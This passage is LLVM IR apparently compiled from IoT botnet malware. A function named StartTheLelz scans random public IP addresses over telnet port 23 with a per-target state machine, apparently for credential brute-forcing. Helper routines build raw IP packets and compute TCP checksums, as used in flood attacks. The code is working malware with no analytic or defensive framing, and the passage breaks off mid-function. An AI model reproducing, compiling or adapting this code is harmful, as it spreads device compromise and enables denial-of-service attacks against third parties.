  store i8 %161, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = call i32 @rand() #12
  %163 = srem i32 %162, 255
  %164 = trunc i32 %163 to i8
  store i8 %164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %37, !llvm.loop !37

165:                                              ; preds = %153
  %166 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %166, i8 0, i64 16, i1 false)
  %167 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i64 0, i64 0
  %168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %169 = zext i8 %168 to i32
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %173 = zext i8 %172 to i32
  %174 = call i32 (i8*, i8*, ...) @szprintf(i8* %167, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i64 0, i64 0), i32 %169, i32 %171, i32 %173)
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i64 0, i64 0
  %176 = call i32 @inet_addr(i8* %175) #12
  store i32 %176, i32* %1, align 4
  br label %177

177:                                              ; preds = %165, %11
  %178 = load i32, i32* %1, align 4
  ret i32 %178
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomIP(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #15
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @csum(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !38

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !39

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* %0, %struct.tcphdr* %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias align 16 i8* @malloc(i64 %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #12
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* %0, i32 %1, i32 %2, i8 zeroext %3, i32 %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.fd_set*, align 8
  %14 = call i32 @getdtablesize() #12
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 4096
  br i1 %18, label %19, label %20

19:                                               ; preds = %0
  br label %22

20:                                               ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

22:                                               ; preds = %20, %19
  %23 = phi i32 [ 4096, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #15
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %28, i8 0, i64 8, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store i64 %30, i64* %10, align 8
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %33, i8 0, i64 %36, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

37:                                               ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %59

41:                                               ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias align 16 i8* @malloc(i64 1024) #12
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %55, i8 0, i64 1024, i1 false)
  br label %56

56:                                               ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %37, !llvm.loop !40

59:                                               ; preds = %37
  br label %60

60:                                               ; preds = %1288, %59
  br label %61

61:                                               ; preds = %60
  store i32 0, i32* %2, align 4
  br label %62

62:                                               ; preds = %1285, %61
  %63 = load i32, i32* %2, align 4
  %64 = load i32, i32* %1, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %1288

66:                                               ; preds = %62
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 2
  %71 = load i8, i8* %70, align 8
  %72 = zext i8 %71 to i32
  switch i32 %72, label %1284 [
    i32 0, label %73
    i32 1, label %216
    i32 2, label %378
    i32 3, label %465
    i32 4, label %533
    i32 5, label %657
    i32 6, label %725
    i32 7, label %869
    i32 8, label %897
    i32 9, label %925
    i32 10, label %953
    i32 100, label %1085
    i32 101, label %1113
    i32 102, label %1141
    i32 103, label %1169
  ]

73:                                               ; preds = %66
  %74 = load i32, i32* %2, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %75
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %76, i32 0, i32 8
  %78 = load i8*, i8** %77, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %78, i8 0, i64 1024, i1 false)
  %79 = load i32, i32* %2, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 3
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %105

85:                                               ; preds = %73
  %86 = load i32, i32* %2, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 8
  %90 = load i8*, i8** %89, align 8
  store i8* %90, i8** %11, align 8
  %91 = load i32, i32* %2, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %92
  %94 = bitcast %struct.telstate_t* %93 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %94, i8 0, i64 32, i1 false)
  %95 = load i8*, i8** %11, align 8
  %96 = load i32, i32* %2, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 8
  store i8* %95, i8** %99, align 8
  %100 = call i32 @getRandomPublicIP()
  %101 = load i32, i32* %2, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 1
  store i32 %100, i32* %104, align 4
  br label %144

105:                                              ; preds = %73
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %107
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %108, i32 0, i32 5
  %110 = load i8, i8* %109, align 1
  %111 = add i8 %110, 1
  store i8 %111, i8* %109, align 1
  %112 = load i32, i32* %2, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 5
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i64
  %118 = icmp eq i64 %117, 14
  br i1 %118, label %119, label %130

119:                                              ; preds = %105
  %120 = load i32, i32* %2, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 5
  store i8 0, i8* %123, align 1
  %124 = load i32, i32* %2, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 4
  %128 = load i8, i8* %127, align 2
  %129 = add i8 %128, 1
  store i8 %129, i8* %127, align 2
  br label %130

130:                                              ; preds = %119, %105
  %131 = load i32, i32* %2, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 4
  %135 = load i8, i8* %134, align 2
  %136 = zext i8 %135 to i64
  %137 = icmp eq i64 %136, 7
  br i1 %137, label %138, label %143

138:                                              ; preds = %130
  %139 = load i32, i32* %2, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 3
  store i8 1, i8* %142, align 1
  br label %1285

143:                                              ; preds = %130
  br label %144

144:                                              ; preds = %143, %85
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %145, align 4
  %146 = call zeroext i16 @htons(i16 zeroext 23) #15
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %146, i16* %147, align 2
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %149 = getelementptr inbounds [8 x i8], [8 x i8]* %148, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %149, i8 0, i64 8, i1 false)
  %150 = load i32, i32* %2, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %154, i32* %156, align 4
  %157 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %158 = load i32, i32* %2, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 0
  store i32 %157, i32* %161, align 16
  %162 = load i32, i32* %2, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 0
  %166 = load i32, i32* %165, align 16
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %144
  br label %1285

169:                                              ; preds = %144
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 16
  %175 = load i32, i32* %2, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 16
  %180 = call i32 (i32, i32, ...) @fcntl(i32 %179, i32 3, i8* null)
  %181 = or i32 %180, 2048
  %182 = call i32 (i32, i32, ...) @fcntl(i32 %174, i32 4, i32 %181)
  %183 = load i32, i32* %2, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %184
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 16
  %188 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %189 = call i32 @connect(i32 %187, %struct.sockaddr* %188, i32 16)
  %190 = icmp eq i32 %189, -1
  br i1 %190, label %191, label %206

191:                                              ; preds = %169
  %192 = call i32* @__errno_location() #15
  %193 = load i32, i32* %192, align 4
  %194 = icmp ne i32 %193, 115
  br i1 %194, label %195, label %206

195:                                              ; preds = %191
  %196 = load i32, i32* %2, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 0
  %200 = load i32, i32* %199, align 16
  %201 = call i32 @sclose(i32 %200)
  %202 = load i32, i32* %2, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 3
  store i8 1, i8* %205, align 1
  br label %215

206:                                              ; preds = %191, %169
  %207 = load i32, i32* %2, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 2
  store i8 1, i8* %210, align 8
  %211 = load i32, i32* %2, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 6
  store i32 0, i32* %214, align 4
  br label %215

215:                                              ; preds = %206, %195
  br label %1284

216:                                              ; preds = %66
  %217 = load i32, i32* %2, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 6
  %221 = load i32, i32* %220, align 4
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %223, label %229

223:                                              ; preds = %216
  %224 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %225 = load i32, i32* %2, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 6
  store i32 %224, i32* %228, align 4
  br label %229

229:                                              ; preds = %223, %216
  br label %230

230:                                              ; preds = %229
  store %struct.fd_set* %4, %struct.fd_set** %13, align 8
  store i32 0, i32* %12, align 4
  br label %231

231:                                              ; preds = %241, %230
  %232 = load i32, i32* %12, align 4
  %233 = zext i32 %232 to i64
  %234 = icmp ult i64 %233, 16
  br i1 %234, label %235, label %244

235:                                              ; preds = %231
  %236 = load %struct.fd_set*, %struct.fd_set** %13, align 8
  %237 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %236, i32 0, i32 0
  %238 = load i32, i32* %12, align 4
  %239 = zext i32 %238 to i64
  %240 = getelementptr inbounds [16 x i64], [16 x i64]* %237, i64 0, i64 %239
  store i64 0, i64* %240, align 8
  br label %241

241:                                              ; preds = %235
  %242 = load i32, i32* %12, align 4
  %243 = add i32 %242, 1
  store i32 %243, i32* %12, align 4
  br label %231, !llvm.loop !41

244:                                              ; preds = %231
  br label %245

245:                                              ; preds = %244
  br label %246

246:                                              ; preds = %245
  %247 = load i32, i32* %2, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 16
  %252 = srem i32 %251, 64
  %253 = zext i32 %252 to i64
  %254 = shl i64 1, %253
  %255 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i32 0, i32 0
  %256 = load i32, i32* %2, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %257
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %258, i32 0, i32 0
  %260 = load i32, i32* %259, align 16
  %261 = sdiv i32 %260, 64
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [16 x i64], [16 x i64]* %255, i64 0, i64 %262
  %264 = load i64, i64* %263, align 8
  %265 = or i64 %264, %254
  store i64 %265, i64* %263, align 8
  %266 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %266, align 8
  %267 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %267, align 8
  %268 = load i32, i32* %2, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 16
  %273 = add nsw i32 %272, 1
  %274 = call i32 @select(i32 %273, %struct.fd_set* null, %struct.fd_set* %4, %struct.fd_set* null, %struct.timeval* %5)
  store i32 %274, i32* %3, align 4
  %275 = load i32, i32* %3, align 4
  %276 = icmp eq i32 %275, 1
  br i1 %276, label %277, label %334

277:                                              ; preds = %246
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %278 = load i32, i32* %2, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 0
  %282 = load i32, i32* %281, align 16
  %283 = bitcast i32* %7 to i8*
  %284 = call i32 @getsockopt(i32 %282, i32 1, i32 4, i8* %283, i32* %6) #12
  %285 = load i32, i32* %7, align 4
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %302

287:                                              ; preds = %277
  %288 = load i32, i32* %2, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 0
  %292 = load i32, i32* %291, align 16
  %293 = call i32 @sclose(i32 %292)
  %294 = load i32, i32* %2, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %295
